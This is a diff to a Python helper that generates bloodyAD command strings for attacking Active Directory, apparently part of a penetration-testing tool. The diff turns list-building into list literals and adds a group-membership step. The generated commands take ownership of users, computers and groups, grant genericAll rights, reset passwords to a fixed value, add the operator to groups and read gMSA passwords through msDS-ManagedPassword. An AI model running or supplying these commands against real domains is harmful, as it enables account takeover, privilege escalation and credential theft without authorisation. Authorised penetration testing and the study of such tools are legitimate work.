@@ -10,37 +10,25 @@ def generate_bloodyAD_command(choice, **kwargs):
     elif choice == "4":
         return f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['DN']} {kwargs['target_username']}"
     elif choice == "5_user":
-        commands = []
-        commands.append(
-            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set owner {kwargs['target_user']} {kwargs['username']}"
-        )
-        commands.append(
-            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['target_user']} {kwargs['username']}"
-        )
-        commands.append(
+        commands = [
+            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set owner {kwargs['target_user']} {kwargs['username']}",
+            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['target_user']} {kwargs['username']}",
             f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set password {kwargs['target_user']} NewStrongPassword123!"
-        )
+        ]
         return "\n".join(commands)
     elif choice == "5_computer":
-        commands = []
-        commands.append(
-            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set owner {kwargs['target_computer']} {kwargs['username']}"
-        )
-        commands.append(
-            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['target_computer']} {kwargs['username']}"
-        )
-        commands.append(
+        commands = [
+            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set owner {kwargs['target_computer']} {kwargs['username']}",
+            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['target_computer']} {kwargs['username']}",
             f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set password {kwargs['target_computer']} NewStrongPassword123!"
-        )
+        ]
         return "\n".join(commands)
     elif choice == "5_group":
-        commands = []
-        commands.append(
-            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set owner {kwargs['target_group']} {kwargs['username']}"
-        )
-        commands.append(
-            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['target_group']} {kwargs['username']}"
-        )
+        commands = [
+            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set owner {kwargs['target_group']} {kwargs['username']}",
+            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['target_group']} {kwargs['username']}",
+            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add groupMember {kwargs['target_group']} {kwargs['username']}"
+        ]
         return "\n".join(commands)
     elif choice == "6":
         return f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} get object {kwargs['target_username']} --attr msDS-ManagedPassword"
